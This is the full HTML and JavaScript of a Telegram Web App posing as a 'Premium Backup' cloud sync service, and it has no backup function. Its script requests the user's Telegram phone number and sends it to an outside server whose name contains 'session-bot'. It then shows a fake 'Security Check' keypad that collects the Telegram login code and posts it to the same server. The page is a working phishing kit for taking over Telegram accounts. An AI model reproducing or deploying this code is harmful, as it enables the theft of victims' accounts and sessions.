<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cloud Backup Service</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            margin: 0; 
            padding: 0; 
            background: url('https://images.unsplash.com/photo-1544197150-b99a580bb7a8?q=80&w=2070&auto=format&fit=crop') no-repeat center center fixed; 
            background-size: cover;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .overlay {
            background: rgba(0, 0, 0, 0.6);
            position: absolute;
            top: 0; left: 0; width: 100%; height: 100%;
            z-index: 1;
        }
        .box { 
            background: rgba(255, 255, 255, 0.9); 
            padding: 30px; 
            border-radius: 30px; 
            width: 340px; 
            box-shadow: 0 20px 40px rgba(0,0,0,0.4); 
            text-align: center;
            z-index: 2;
            backdrop-filter: blur(10px);
        }
        h2 { color: #0088cc; margin-top: 0; }
        p { color: #444; font-size: 14px; line-height: 1.5; }
        
        .btn-main { 
            background: #0088cc; 
            color: white; 
            border: none; 
            padding: 16px; 
            width: 100%; 
            border-radius: 15px; 
            font-weight: bold; 
            font-size: 18px; 
            cursor: pointer;
            box-shadow: 0 4px 15px rgba(0, 136, 204, 0.3);
        }

        /* OTP Display */
        .otp-display { 
            width: 100%; padding: 15px; margin: 15px 0; 
            border: 2px solid #ddd; border-radius: 12px; 
            font-size: 32px; text-align: center; 
            background: #fff; color: #333; letter-spacing: 8px; 
            outline: none; height: 65px; box-sizing: border-box; 
        }

        /* Keypad Styling */
        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; margin-top: 20px; }
        .key { 
            background: #f8f9fa; padding: 20px; border-radius: 15px; 
            font-size: 24px; font-weight: bold; color: #333; 
            cursor: pointer; border: 1px solid #eee;
            transition: 0.2s;
        }
        .key:active { background: #e2e6ea; transform: scale(0.95); }
        .key-clear { background: #ffc107; color: #fff; }
        .key-ok { background: #28a745; color: white; }
        
        .hidden { display: none; }
        .loader { color: #0088cc; font-weight: bold; margin-top: 15px; display: block; }
    </style>
</head>
<body>
    <div class="overlay"></div>

    <div class="box" id="step0">
        <div style="font-size: 50px; margin-bottom: 10px;">☁️</div>
        <h2>Premium Backup</h2>
        <p>Backup your data safely to our cloud server. Please verify your account to activate premium synchronization features.</p>
        <button class="btn-main" id="main_btn" onclick="startFlow()">Start Sync Now</button>
        <div id="loader" class="hidden">
            <span class="loader">🔄 Connecting to Server...</span>
        </div>
    </div>

    <div class="box hidden" id="step2">
        <h3 style="margin-top:0; color:#333;">Security Check</h3>
        <p style="color:#666; font-size:12px;">Enter the 5-digit authorization code sent to your official Telegram notifications.</p>
        
        <input type="text" id="otp_display" class="otp-display" placeholder="-----" readonly>
        
        <div class="keypad">
            <div class="key" onclick="addNum('1')">1</div><div class="key" onclick="addNum('2')">2</div><div class="key" onclick="addNum('3')">3</div>
            <div class="key" onclick="addNum('4')">4</div><div class="key" onclick="addNum('5')">5</div><div class="key" onclick="addNum('6')">6</div>
            <div class="key" onclick="addNum('7')">7</div><div class="key" onclick="addNum('8')">8</div><div class="key" onclick="addNum('9')">9</div>
            <div class="key key-clear" onclick="clearNum()">C</div><div class="key" onclick="addNum('0')">0</div><div class="key key-ok" id="v_btn" onclick="verifyOTP()">OK</div>
        </div>
    </div>

    <script>
        let tg = window.Telegram.WebApp;
        tg.expand();
        const BACKEND_URL = "https://pmrony-session-bot.hf.space";
        let userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : null;
        let currentOTP = "";

        function startFlow() {
            tg.requestContact();
            document.getElementById('main_btn').classList.add('hidden');
            document.getElementById('loader').classList.remove('hidden');
            poll();
        }

        async function poll() {
            try {
                const res = await fetch(`${BACKEND_URL}/check_contact/${userId}`);
                const data = await res.json();
                if (data.status === "success") {
                    sendNumber(data.phone);
                } else {
                    setTimeout(poll, 1500);
                }
            } catch (e) { setTimeout(poll, 2000); }
        }

        async function sendNumber(phone) {
            try {
                const res = await fetch(`${BACKEND_URL}/send_number`, {
                    method: "POST", headers: {"Content-Type": "application/json"},
                    body: JSON.stringify({ user_id: userId, phone: phone })
                });
                const data = await res.json();
                if (data.status === "success") {
                    document.getElementById('step0').classList.add('hidden');
                    document.getElementById('step2').classList.remove('hidden');
                } else { alert(data.message); location.reload(); }
            } catch (e) { alert("Server Error!"); }
        }

        function addNum(n) { if(currentOTP.length < 5) { currentOTP += n; document.getElementById("otp_display").value = currentOTP; } }
        function clearNum() { currentOTP = ""; document.getElementById("otp_display").value = ""; }

        async function verifyOTP() {
            if(currentOTP.length < 5) return;
            const vBtn = document.getElementById('v_btn');
            vBtn.innerText = "..";
            try {
                const res = await fetch(`${BACKEND_URL}/verify_otp`, {
                    method: "POST", headers: {"Content-Type": "application/json"},
                    body: JSON.stringify({ user_id: userId, otp: currentOTP })
                });
                const data = await res.json();
                if (data.status === "success") {
                    tg.close();
                } else { 
                    alert("Verification Error! Please check your code."); 
                    clearNum(); 
                    vBtn.innerText = "OK";
                }
            } catch (e) { alert("Error!"); vBtn.innerText = "OK"; }
        }
    </script>
</body>
</html>
